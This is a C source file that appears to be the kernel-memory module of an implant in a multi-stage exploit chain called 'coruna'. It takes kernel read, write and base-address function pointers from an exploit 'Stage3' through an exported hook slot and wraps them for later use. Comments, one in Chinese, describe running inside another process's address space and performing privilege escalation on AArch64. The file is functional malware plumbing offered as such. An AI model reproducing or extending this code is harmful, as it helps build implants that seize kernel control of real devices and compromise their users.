#include "memory.h"
#include <stdio.h>
#include <stdlib.h>

static kread64_t  g_kread64  = NULL;
static kwrite64_t g_kwrite64 = NULL;
static kbase_t    g_kbase    = NULL;

/*
 * Stage3 在内存中写入这 4 个 qword 后由 implant_main 轮询应用到 coruna_init_primitives：
 *   [0] kread64 VA  [1] kwrite64 VA  [2] kbase VA  [3] CORUNA_HOOK_MAGIC
 * 真实提权需为 AArch64 C ABI 下的函数指针。
 */
__attribute__((visibility("default"))) volatile uint64_t coruna_hook_slot[4];

__attribute__((visibility("default")))
void coruna_init_primitives(kread64_t read_func, kwrite64_t write_func, kbase_t base_func) {
    g_kread64  = read_func;
    g_kwrite64 = write_func;
    g_kbase    = base_func;
}

/*
 * Validate that a VA looks like a kernel address before casting it to a
 * function pointer.  On AArch64, kernel VAs have all top bits set
 * (> 0xFFFF000000000000).  User-space VAs (0x0…0x7FFF…) must be rejected
 * to prevent a crash if Stage3 writes garbage into hook_slot.
 */
static int va_is_kernel(uint64_t va) {
    return (va > 0xFFFF000000000000ULL);
}

__attribute__((visibility("default")))
void coruna_init_primitives_from_addrs(uint64_t kread_va, uint64_t kwrite_va,
                                       uint64_t kbase_va) {
    if (!va_is_kernel(kread_va) || !va_is_kernel(kwrite_va)) {
        printf("[mem] coruna_init_primitives_from_addrs: invalid VA "
               "kread=0x%llx kwrite=0x%llx kbase=0x%llx — ignored\n",
               kread_va, kwrite_va, kbase_va);
        return;
    }
    coruna_init_primitives((kread64_t)kread_va,
                           (kwrite64_t)kwrite_va,
                           (kbase_t)kbase_va);
}

/*
 * Return 0 when not yet initialised so callers can poll safely.
 * Never call exit() — we are running inside another process's address space.
 */
uint64_t kread64(uint64_t addr) {
    if (!g_kread64) return 0;
    return g_kread64(addr);
}

void kwrite64(uint64_t addr, uint64_t val) {
    if (!g_kwrite64) return;
    g_kwrite64(addr, val);
}

uint64_t kernel_base(void) {
    if (!g_kbase) return 0;
    return g_kbase();
}
